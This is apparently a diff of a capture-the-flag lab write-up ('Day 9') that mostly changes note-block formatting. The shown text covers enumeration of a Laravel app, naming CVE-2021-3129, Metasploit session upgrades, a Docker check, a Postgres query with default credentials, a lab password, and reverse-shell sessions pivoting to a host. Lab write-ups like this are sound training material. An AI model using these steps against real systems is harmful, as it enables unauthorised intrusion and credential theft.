@@ -2,7 +2,6 @@
 title: "Day 9"
 ---
 
-
 ## Deploy the attached VM, and wait a few minutes. What ports are open?
 
 ```bash
@@ -21,28 +20,24 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-:::note
-80
-:::
+!!! note
+    80
 
 ## What framework is the web application developed with?
 
 Using `whatweb` to enumerate this website shows
-
 
 ```bash
 whatweb http://10.10.154.224  
 http://10.10.154.224 [200 OK] Apache[2.4.54], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], HttpOnly[laravel_session], IP[10.10.154.224], Laravel, PHP[7.4.30], Title[Curabitur aliquet, libero id suscipit semper], X-Powered-By[PHP/7.4.30]
 ```
 
-
 The response of the network browser also confirms it
 
 ![](../../assets/image-19.png)
 
-:::note
-Laravel
-:::
+!!! note
+    Laravel
 
 ## What CVE is the application vulnerable to?
 
@@ -50,25 +45,22 @@ Search on google for Laravel CVE we can find this blog post:&#x20;
 
 [Laravel RCE CVE-2021-3129 Explanation](https://pentest-tools.com/blog/exploit-rce-vulnerability-laravel-cve-2021-3129)
 
-:::note
-CVE-2021-3129
-:::
+!!! note
+    CVE-2021-3129
 
 ## What command can be used to upgrade the last opened session to a Meterpreter session?
 
 Note that normal command shells do not support complex operations such as pivoting. In Metasploit’s console, you can upgrade the last opened Metasploit session to a Meterpreter session with `sessions -u -1`.
 
-:::note
-sessions -u -1
-:::
+!!! note
+    sessions -u -1
 
 ## What file indicates a session has been opened within a Docker container?
 
 A common way to tell if a compromised application is running in a Docker container is to verify the existence of a `/.dockerenv` file at the root directory of the filesystem.
 
-:::note
-`/.dockerenv`
-:::
+!!! note
+    `/.dockerenv`
 
 ## What file often contains useful credentials for web applications?
 
@@ -154,19 +146,15 @@ use auxiliary/admin/postgres/postgres_sql
 run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
 ```
 
-:::note
-users
-:::
+!!! note
+    users
 
 What is Santa's password?\
 
-
-
 ![](../../assets/image-2.png)
 
-:::note
-p4\$$w0rd
-:::
+!!! note
+    p4\$$w0rd
 
 ## What ports are open on the host machine?
 
@@ -199,9 +187,8 @@ Nmap done: 1 IP address (1 host up) scanned in 0.75 seconds
 
 ![](../../assets/image-5.png)
 
-:::note
-22,80
-:::
+!!! note
+    22,80
 
 ## What is the root flag?
 
@@ -227,7 +214,6 @@ Active sessions
   1         shell cmd/unix                                   10.8.30.181:4444 -> 10.10.154.224:56420 (10.10.154.224)
   2         meterpreter x86/linux  www-data @ 172.28.101.50  10.8.30.181:4433 -> 10.10.154.224:44460 (172.28.101.50)
   3         shell linux            SSH parallels @           10.8.30.181-10.10.154.224:52780 -> 172.17.0.1:22 (172.17.0.1)
-
 
 sessions -i -1
 ```
